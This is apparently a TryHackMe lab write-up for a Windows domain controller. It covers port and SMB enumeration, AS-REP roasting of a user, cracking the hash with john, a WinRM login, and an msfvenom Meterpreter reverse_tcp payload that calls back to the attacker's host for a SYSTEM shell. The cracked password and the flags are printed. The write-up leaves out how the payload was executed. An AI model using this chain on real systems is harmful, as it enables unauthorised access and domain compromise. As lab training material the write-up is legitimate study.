Services IP:10.10.132.53


rustscan:
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
3389/tcp  open  ms-wbt-server    syn-ack
7680/tcp  open  pando-pub        syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49668/tcp open  unknown          syn-ack
49669/tcp open  unknown          syn-ack
49670/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49673/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
49676/tcp open  unknown          syn-ack
49694/tcp open  unknown          syn-ack
49697/tcp open  unknown          syn-ack
49702/tcp open  unknown          syn-ack




nmap:

PORT      STATE  SERVICE       REASON       VERSION
53/tcp    open   domain        syn-ack      Simple DNS Plus
80/tcp    open   http          syn-ack      Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Above Services
88/tcp    open   kerberos-sec  syn-ack      Microsoft Windows Kerberos (server time: 2023-06-07 12:07:43Z)
135/tcp   open   msrpc         syn-ack      Microsoft Windows RPC
139/tcp   open   netbios-ssn   syn-ack      Microsoft Windows netbios-ssn
389/tcp   open   ldap          syn-ack      Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds? syn-ack
464/tcp   open   kpasswd5?     syn-ack
593/tcp   open   ncacn_http    syn-ack      Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped    syn-ack
3268/tcp  open   ldap          syn-ack      Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped    syn-ack
3389/tcp  open   ms-wbt-server syn-ack      Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SERVICES
|   NetBIOS_Domain_Name: SERVICES
|   NetBIOS_Computer_Name: WIN-SERVICES
|   DNS_Domain_Name: services.local
|   DNS_Computer_Name: WIN-SERVICES.services.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-06-07T12:08:39+00:00
| ssl-cert: Subject: commonName=WIN-SERVICES.services.local
| Issuer: commonName=WIN-SERVICES.services.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-02-14T05:27:26
| Not valid after:  2023-08-16T05:27:26
| MD5:   442e 8650 5e98 cc14 675f 354d d48c 1261
| SHA-1: 92cb 686b 270c a08f f24f 88f8 5cec 77b7 8382 8dce
| -----BEGIN CERTIFICATE-----
| MIIC+jCCAeKgAwIBAgIQWb29WcS+J4ZJvG5+5aZqnTANBgkqhkiG9w0BAQsFADAm
| MSQwIgYDVQQDExtXSU4tU0VSVklDRVMuc2VydmljZXMubG9jYWwwHhcNMjMwMjE0
| MDUyNzI2WhcNMjMwODE2MDUyNzI2WjAmMSQwIgYDVQQDExtXSU4tU0VSVklDRVMu
| c2VydmljZXMubG9jYWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDJ
| 6bIXYXNyrGVLcg83UXS0GcVolTyFxyNVFs6lzicIJVFRPWE67/+th6Teq2ffyYdI
| vtZy6jynzMyD6gXeAwCRsU2c+Y+Z2hnBMPf1iO+3ggNwpyPkTdIMtZQ3vgA6b7qE
| 6onKlJWw4NCYcOeuhU66SuubBPqlBd3JGxgLRkc2EGmk8A0wa9M3sTHvog03JJd+
| FILqSlaV3kniZtNLzl/Cc0ANnYaTY4VBUwGnTfMZJ2hHhLEpceJE1FsurZIQshJc
| XV9qaPXaQyWpxBb92ieo+Il/QacLezWWM1065Fe2RxtCoWHZDtejFDAbhoitEbmS
| rs4W957oYSgbWs2I3uwxAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsG
| A1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAm0mw4muosYAqtft14Z/fko9i
| jnsdR8OFqf3Hk6wfhoRxMlfs4m6+8xekYAr6raorPxqCSPRaBKY03pKMGAt6Lm08
| ojNTmgqqdyf/OrK16wF+8BEEfVD/6IOdpcXueQOwiBts+uUsCuNrLR0m4ZUL1eXk
| YxVdNSwN0dlDQUdgEng77g9vAI3kMpEe3iXJ6sd6L8uKlHL70XV/UDxQJPu0TfEi
| TFm4FAYxOwmXQ+E5zj2ZdDbG11B688tgbCMma7tlASgTuKT3u56N8WpSYjVCAqFV
| fFglOSPTiyescctwV1kRx/eFCaOFeYlOFO1plDMYyaPh1bnNNC0b50l8TlHULw==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-06-07T12:08:46+00:00; +29s from scanner time.
7680/tcp  closed pando-pub     conn-refused
9389/tcp  open   mc-nmf        syn-ack      .NET Message Framing
47001/tcp open   http          syn-ack      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49665/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49666/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49668/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49669/tcp open   ncacn_http    syn-ack      Microsoft Windows RPC over HTTP 1.0
49670/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49671/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49673/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49674/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49676/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49694/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49697/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49702/tcp open   msrpc         syn-ack      Microsoft Windows RPC
Service Info: Host: WIN-SERVICES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 29s, deviation: 0s, median: 28s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 64889/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 23665/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 20314/udp): CLEAN (Timeout)
|   Check 4 (port 17365/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-06-07T12:08:41
|_  start_date: N/A






enum4linux:

 enum4linux -v 10.10.132.53
[V] Dependent program "nmblookup" found in /usr/bin/nmblookup
[V] Dependent program "net" found in /usr/bin/net
[V] Dependent program "rpcclient" found in /usr/bin/rpcclient
[V] Dependent program "smbclient" found in /usr/bin/smbclient
[V] Dependent program "polenum" found in /usr/bin/polenum
[V] Dependent program "ldapsearch" found in /usr/bin/ldapsearch
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jun  7 08:02:31 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.132.53
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.132.53    |
 ==================================================== 
[V] Attempting to get domain name with command: nmblookup -A '10.10.132.53'
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.132.53    |
 ============================================ 
Looking up status of 10.10.132.53
No reply from 10.10.132.53

 ===================================== 
|    Session Check on 10.10.132.53    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[V] Attempting to make null session using command: smbclient -W '' //'10.10.132.53'/ipc$ -U''%'' -c 'help' 2>&1
[+] Server 10.10.132.53 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.132.53    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
[V] Attempting to get domain SID with command: rpcclient -W '' -U''%'' 10.10.132.53 -c 'lsaquery' 2>&1
Domain Name: SERVICES
Domain Sid: S-1-5-21-1966530601-3185510712-10604624
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on 10.10.132.53    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
[V] Attempting to get OS info with command: smbclient -W '' //'10.10.132.53'/ipc$ -U''%'' -c 'q' 2>&1
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.132.53 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[V] Attempting to get OS info with command: rpcclient -W '' -U''%'' -c 'srvinfo' '10.10.132.53' 2>&1
[+] Got OS info for 10.10.132.53 from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.132.53    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[V] Attempting to get userlist with command: rpcclient -W '' -c querydispinfo -U''%'' '10.10.132.53' 2>&1
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[V] Attempting to get userlist with command: rpcclient -W '' -c enumdomusers -U''%'' '10.10.132.53' 2>&1
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================= 
|    Share Enumeration on 10.10.132.53    |
 ========================================= 
[V] Attempting to get share list using authentication
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to 10.10.132.53 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.132.53

 ==================================================== 
|    Password Policy Information for 10.10.132.53    |
 ==================================================== 
[V] Attempting to get Password Policy info with command: polenum '':''@'10.10.132.53' 2>&1
[E] Unexpected error from polenum:


[+] Attaching to 10.10.132.53 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.132.53)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
[V] Attempting to get Password Policy info with command: rpcclient -W '' -U''%'' '10.10.132.53' -c "getdompwinfo" 2>&1

[E] Failed to get password policy with rpcclient


 ============================== 
|    Groups on 10.10.132.53    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting builtin groups with command: rpcclient -W '' -U''%'' '10.10.132.53' -c 'enumalsgroups builtin' 2>&1

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting local groups with command: rpcclient -W '' -U''%'' '10.10.132.53' -c 'enumalsgroups domain' 2>&1

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
[V] Getting domain groups with command: rpcclient -W '' -U''%'' '10.10.132.53' -c "enumdomgroups" 2>&1

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.132.53 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[V] Attempting to get SID from 10.10.132.53 with command: rpcclient -W '' -U''%'' '10.10.132.53' -c 'lookupnames administrator' 2>&1
[V] Assuming that user "administrator" exists
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
[V] Attempting to get SIDs from 10.10.132.53 with command: rpcclient -W '' -U''%'' '10.10.132.53' -c lsaenumsid 2>&1

 ============================================= 
|    Getting printer info for 10.10.132.53    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
[V] Attempting to get printer info with command: rpcclient -W '' -U''%'' -c 'enumprinters' '10.10.132.53' 2>&1
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Wed Jun  7 08:03:06 2023




smbclient:

smbclient -N -L ///10.10.132.53                                      
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.132.53 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


no information available on smb. Weird.


crackmapexec:

─(kali㉿kali)-[~/Practice/tryhackme/Services]
└─$ crackmapexec smb 10.10.132.53 -u ""  -p "" 
SMB         10.10.132.53    445    WIN-SERVICES     [*] Windows 10.0 Build 17763 x64 (name:WIN-SERVICES) (domain:services.local) (signing:True) (SMBv1:False)
SMB         10.10.132.53    445    WIN-SERVICES     [-] services.local\: STATUS_ACCESS_DENIED 










Visiting the page on port 80, we find an email:


j.doe@services.local  that seems to be the email of Joanne Doe. Thre are also other members of the team presented on the site. We can create an user list knowing the format of the usernames


lets' test our usernames list to see if they are valid;

(kali㉿kali)-[~/Downloads]
└─$ ./kerbrute userenum --dc 10.10.132.53 -d services.local /home/kali/Practice/tryhackme/Services/usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/07/23 - Ronnie Flathers @ropnop

2023/06/07 08:14:37 >  Using KDC(s):
2023/06/07 08:14:37 >   10.10.132.53:88

2023/06/07 08:14:37 >  [+] VALID USERNAME:       Administrator@services.local
2023/06/07 08:14:37 >  [+] VALID USERNAME:       j.larusso@services.local
2023/06/07 08:14:37 >  [+] VALID USERNAME:       j.doe@services.local
2023/06/07 08:14:37 >  [+] VALID USERNAME:       w.masters@services.local
2023/06/07 08:14:37 >  [+] VALID USERNAME:       j.rock@services.local
2023/06/07 08:14:37 >  Done! Tested 5 usernames (5 valid) in 0.243 seconds


(kali㉿kali)-[~/Practice/tryhackme/Services]
└─$ impacket-GetNPUsers services.local/ -no-pass -usersfile usernames.txt                                                                                                                        2 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User j.doe doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$j.rock@SERVICES.LOCAL:1a376ce3bef82676d5384cc8e9fd84be$3bd69ed8da7e5a0c32be580518491f6d0160762ef65a2db268e6b7b1b3fe01701403a61f80ffc043e5744ff19d2bc97113e63202ed7596101e6fa8bc4a8021b91fe5c1bbe791127888298f2b35054ba6d7391e0362bd7bb7efeff1d7d732658751f66b09392e77e70d626bc49679679eecc9db35e63d65691fe482d33bd67ecfcd5c22ed6c1a96ecd817befae11df6dfd1e2be8256107cef89f6a93a75b4b8c640600b667d6c31e8ff8291e7636bb0529a060ff7830d556d92e72969ac0c62755bdd0fcf71b4659efbe45bfae309b2c13ef4c9c608b4d56fb6c7f9aee2e0ed7343f7ed945c62287f9797fab32d5bb1a4
[-] User w.masters doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.larusso doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set


we save jrock hash into another file, and then we user john to crack the hash:

john --wordlist=/usr/share/wordlists/rockyou.txt hash        
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Serviceworks1    ($krb5asrep$23$j.rock@SERVICES.LOCAL)     
1g 0:00:00:05 DONE (2023-06-07 08:19) 0.1782g/s 1890Kp/s 1890Kc/s 1890KC/s Sgto1ro..Sergio03
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

we can now use evilwinrm to log in a j.rock:


─(kali㉿kali)-[~/Practice/tryhackme/Services]
└─$ evil-winrm -i 10.10.132.53 -u j.rock -p 'Serviceworks1'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\j.rock\Documents> 



user flag:

*Evil-WinRM* PS C:\Users\j.rock\Desktop> ls


    Directory: C:\Users\j.rock\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        2/15/2023   5:55 AM             44 user.txt


*Evil-WinRM* PS C:\Users\j.rock\Desktop> cat user.txt
THM{ASr3p_R0aSt1n6}



PrivESC:

*Evil-WinRM* PS C:\Users\j.rock\Desktop> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== ============================================
services\j.rock S-1-5-21-1966530601-3185510712-10604624-1111


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                    Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeSystemtimePrivilege         Change the system time              Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.



*Evil-WinRM* PS C:\Users\j.rock\Desktop> services

Path                                                                           Privileges Service          
----                                                                           ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                            True ADWS             
"C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                   True AmazonSSMAgent   
"C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                     True AWSLiteAgent     
"C:\Program Files\Amazon\cfn-bootstrap\winhup.exe"                                   True cfn-hup          
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                        True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                     True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"          False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                           False TrustedInstaller 
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2302.7-0\NisSrv.exe"        True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2302.7-0\MsMpEng.exe"       True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                False WMPNetworkSvc    


We have some services that are running with privileges, and we notice that we have all of the privileges enabled. we can use an msvenom payload to catch an meterpreter session, and then user getsystem to get nt\authority access:


payload:
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.29.89 LPORT=9001 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe



msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.8.29.89
LHOST => 10.8.29.89
msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.29.89:9001 
[*] Sending stage (175686 bytes) to 10.10.132.53
[*] Meterpreter session 1 opened (10.8.29.89:9001 -> 10.10.132.53:57186) at 2023-06-07 08:35:04 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM



meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  527   fil   2016-06-21 11:36:17 -0400  EC2 Feedback.website
100666/rw-rw-rw-  554   fil   2016-06-21 11:36:23 -0400  EC2 Microsoft Windows Guide.website
100666/rw-rw-rw-  282   fil   2023-02-14 23:44:33 -0500  desktop.ini
100666/rw-rw-rw-  48    fil   2023-02-15 00:53:36 -0500  root.txt

meterpreter > cat root.txt
��THM{S3rv3r_0p3rat0rS}
